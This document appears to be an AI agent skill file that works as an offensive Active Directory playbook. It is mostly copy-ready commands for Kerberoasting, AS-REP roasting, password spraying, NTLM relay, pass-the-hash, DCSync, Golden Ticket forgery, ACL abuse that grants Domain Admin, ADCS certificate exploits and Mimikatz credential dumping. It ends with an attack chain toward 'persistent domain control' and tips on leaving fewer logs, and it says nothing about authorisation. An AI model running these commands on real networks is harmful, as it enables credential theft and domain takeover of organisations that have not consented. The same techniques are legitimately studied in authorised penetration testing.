---
name: active-directory
description: Active Directory attack techniques covering enumeration, Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync, ADCS ESC attacks, and ACL abuse
---

# Active Directory Attacks

AD is the most common enterprise authentication backbone. Compromise follows a pattern: enumerate → credential attack → lateral movement → domain escalation. Most paths lead to DCSync or a Golden Ticket.

---

## Enumeration (Unauthenticated)

### Network Discovery

    # Find DCs
    nmap -p 88,389,445,636,3268,3269 <subnet> --open -oA output/ad_scan
    nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

    # LDAP anonymous query
    ldapsearch -H ldap://<dc_ip> -x -s base namingcontexts
    ldapsearch -H ldap://<dc_ip> -x -b "dc=domain,dc=com" -s sub "(objectclass=*)"

    # SMB null session
    smbclient -L //<dc_ip> -N
    enum4linux-ng -A <dc_ip>
    netexec smb <subnet>/24 --gen-relay-list output/relay_targets.txt

---

## Enumeration (Authenticated)

### BloodHound

    # SharpHound collector (Windows)
    .\SharpHound.exe -c All --zipfilename output.zip

    # BloodHound.py (Linux — remote collection)
    bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc_ip> -c All
    # Or with NTLM hash:
    bloodhound-python -u <user> --hashes :<ntlm_hash> -d <domain> -ns <dc_ip> -c All

    # Import JSON to BloodHound and look for:
    # - Shortest path to Domain Admin
    # - Users with DCSync rights
    # - Kerberoastable users
    # - AS-REP Roastable users

### PowerView / ldapsearch Queries

    # Users and groups
    Get-DomainUser | select name,description,memberof,lastlogon
    Get-DomainGroup -Identity "Domain Admins" | select member
    Get-DomainGroupMember "Domain Admins"

    # Kerberoastable accounts (SPN set)
    Get-DomainUser -SPN | select name,serviceprincipalname
    ldapsearch -H ldap://<dc> -D "<user>@<domain>" -w <pass> -b "dc=domain,dc=com" \
      "(&(objectCategory=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

    # AS-REP Roastable (no preauth required)
    Get-DomainUser -PreauthNotRequired | select name
    ldapsearch -H ldap://<dc> -b "dc=domain,dc=com" \
      "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

    # Password policy (lockout threshold)
    Get-DomainPolicy | select -ExpandProperty SystemAccess

---

## Credential Attacks

### Kerberoasting

Request service tickets for SPN accounts → offline crack:

    # impacket (Linux)
    impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile output/kerberoast.txt

    # Rubeus (Windows)
    .\Rubeus.exe kerberoast /outfile:kerberoast.txt

    # Crack with hashcat
    hashcat -m 13100 output/kerberoast.txt /usr/share/wordlists/rockyou.txt --force

### AS-REP Roasting

No pre-auth = get encrypted TGT without credentials:

    # impacket (no credentials needed)
    impacket-GetNPUsers <domain>/ -usersfile output/users.txt -dc-ip <dc_ip> -no-pass -format hashcat \
      -outputfile output/asrep.txt

    # With credentials (enumerate no-preauth users automatically)
    impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <dc_ip> -request -format hashcat

    # Crack
    hashcat -m 18200 output/asrep.txt /usr/share/wordlists/rockyou.txt

### Password Spraying

    # netexec (formerly CrackMapExec)
    netexec smb <dc_ip> -u output/users.txt -p 'Password123!' --continue-on-success
    netexec smb <dc_ip> -u output/users.txt -p output/passwords.txt --no-brute

    # Kerbrute (Kerberos-based, no lockout indicator difference)
    kerbrute passwordspray -d <domain> --dc <dc_ip> output/users.txt 'Password123!'

### LLMNR/NBT-NS Poisoning (Responder)

    # Capture NTLMv2 hashes from broadcast traffic
    responder -I eth0 -wv

    # Relay captured hashes (no SMB signing)
    netexec smb output/relay_targets.txt --gen-relay-list output/nosign.txt
    impacket-ntlmrelayx -tf output/nosign.txt -smb2support -socks

    # Crack captured NTLMv2:
    hashcat -m 5600 output/captured.txt /usr/share/wordlists/rockyou.txt

---

## Lateral Movement

### Pass-the-Hash

    # impacket suite
    impacket-psexec <domain>/<user>@<target_ip> -hashes :<ntlm_hash>
    impacket-wmiexec <domain>/<user>@<target_ip> -hashes :<ntlm_hash>
    impacket-smbexec <domain>/<user>@<target_ip> -hashes :<ntlm_hash>

    # netexec
    netexec smb <target_ip> -u <user> -H <ntlm_hash> -x "whoami"

### Pass-the-Ticket

    # Rubeus — extract and inject TGT
    .\Rubeus.exe triage
    .\Rubeus.exe dump /luid:<luid> /nowrap
    .\Rubeus.exe ptt /ticket:<base64_ticket>

    # impacket — use .ccache file
    export KRB5CCNAME=ticket.ccache
    impacket-psexec <user>@<target> -k -no-pass

### Overpass-the-Hash (NTLM → Kerberos TGT)

    # Rubeus
    .\Rubeus.exe asktgt /user:<user> /rc4:<ntlm_hash> /ptt

    # impacket
    impacket-getTGT <domain>/<user> -hashes :<ntlm_hash>
    export KRB5CCNAME=<user>.ccache
    impacket-psexec <user>@<dc> -k -no-pass

---

## Domain Escalation

### DCSync (requires Domain Replication rights)

Mimics domain controller replication to extract all password hashes:

    # impacket (Linux)
    impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc
    impacket-secretsdump <domain>/<user>@<dc_ip> -hashes :<ntlm_hash> -just-dc-user Administrator

    # Mimikatz (Windows)
    lsadump::dcsync /domain:<domain> /user:krbtgt
    lsadump::dcsync /domain:<domain> /all /csv

### Golden Ticket

With krbtgt hash, forge TGT for any user/group:

    # Get krbtgt hash via DCSync first:
    impacket-secretsdump <domain>/Administrator@<dc_ip> -just-dc-user krbtgt

    # Forge Golden Ticket (Mimikatz)
    kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> \
      /krbtgt:<krbtgt_hash> /ptt

    # impacket
    impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> Administrator
    export KRB5CCNAME=Administrator.ccache
    impacket-psexec Administrator@<dc> -k -no-pass

### Silver Ticket

Forge service ticket for specific service using service account's hash:

    impacket-ticketer -nthash <service_hash> -domain-sid <sid> -domain <domain> \
      -spn cifs/<target_host> -user-id 500 Administrator

### ACL Abuse

BloodHound reveals ACL edges. Key abusable permissions:

    # WriteDACL over a user → give yourself GenericAll
    Add-DomainObjectAcl -TargetIdentity <target_user> -PrincipalIdentity <your_user> -Rights All

    # GenericAll over a user → reset password
    Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

    # GenericAll over a group → add yourself
    Add-DomainGroupMember -Identity "Domain Admins" -Members <your_user>

    # WriteOwner → change ownership → WriteDACL → GenericAll
    Set-DomainObjectOwner -Identity <target> -OwnerIdentity <your_user>

---

## ADCS (Active Directory Certificate Services)

Check if ADCS is deployed:

    certutil -config - -ping
    netexec ldap <dc_ip> -u <user> -p <pass> -M adcs

### ESC1 — SAN Injection

Enrollment allows specifying Subject Alternative Name → request cert as any user:

    # Find vulnerable templates
    certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable

    # Exploit ESC1
    certipy req -u <user>@<domain> -p <pass> -ca <CA_name> -template <template_name> \
      -upn administrator@<domain> -dc-ip <dc_ip>

    # Authenticate with certificate
    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

### ESC2 — Any Purpose EKU

Same as ESC1 but template has "Any Purpose" or no EKU.

### ESC4 — Vulnerable Certificate Template ACL

    # Template with WriteDACL → modify template to ESC1
    certipy template -u <user>@<domain> -p <pass> -template <template> -save-old -dc-ip <dc_ip>
    # Modify template to allow SAN, then exploit as ESC1

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

CA flag allows SAN on any template:

    certipy req -u <user>@<domain> -p <pass> -ca <CA> -template User \
      -upn administrator@<domain>

### ESC8 — AD CS Web Enrollment NTLM Relay

    # Relay to HTTP enrollment endpoint
    impacket-ntlmrelayx -t http://<CA_server>/certsrv/certfnsh.asp \
      --adcs --template DomainController

    # Use obtained certificate for DCSync or PtT

---

## Credential Extraction (Post-Compromise)

    # Mimikatz in memory
    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

    # LSASS dump (remote)
    impacket-lsadump <domain>/<user>:<pass>@<target>

    # SAM/SYSTEM registry dump
    impacket-secretsdump <domain>/<user>:<pass>@<target>

    # NTDS.dit extraction (DC)
    impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc

---

## Key Tools

    BloodHound:      bloodhound-python (collection) + BloodHound CE (visualization)
    Impacket:        GetUserSPNs, GetNPUsers, secretsdump, psexec, ntlmrelayx, ticketer
    Certipy:         certipy find / req / auth / template / shadow
    netexec:         smb/ldap/winrm enum, PTH, spray, modules
    Rubeus:          kerberoast, asreproast, triage, dump, ptt, asktgt
    Responder:       LLMNR/NBT-NS poisoning, hash capture
    Mimikatz:        logonpasswords, dcsync, golden/silver ticket, ptt
    Kerbrute:        user enum, password spray over Kerberos

---

## Attack Chain (Quick Reference)

    Unauthenticated → LLMNR poisoning (Responder) → NTLMv2 hash → crack → valid creds
    Valid creds → Kerberoast high-priv SPNs → crack → service account creds
    Valid creds → BloodHound → ACL path to DA → abuse WriteDACL/GenericAll → DA
    Valid creds → ADCS ESC1 → cert as Admin → DCSync → domain hashes → Golden Ticket
    DA creds → DCSync → krbtgt hash → Golden Ticket → persistent domain control

---

## Pro Tips

1. Always run BloodHound first — shortest path queries reveal non-obvious attack paths
2. Kerberoasting is noisy; target only high-value SPNs (SQL admin, web service, backup)
3. AS-REP roasting is zero-credential — always check even before getting credentials
4. ADCS ESC1/ESC8 are extremely common and often overlooked — certipy find before anything else
5. ACL abuse chains (WriteDACL → GenericAll → password reset) leave fewer logs than DCSync
6. Don't spray passwords — check the password policy first to avoid lockouts
7. SMB signing must be off for relay attacks — netexec gen-relay-list first

## Summary

AD compromise = credential collection + path finding (BloodHound) + privilege escalation chain. The end goal is DCSync (domain hash dump) or ADCS Golden Cert for persistent access. ADCS is the most underutilized attack path and often the fastest route to DA.
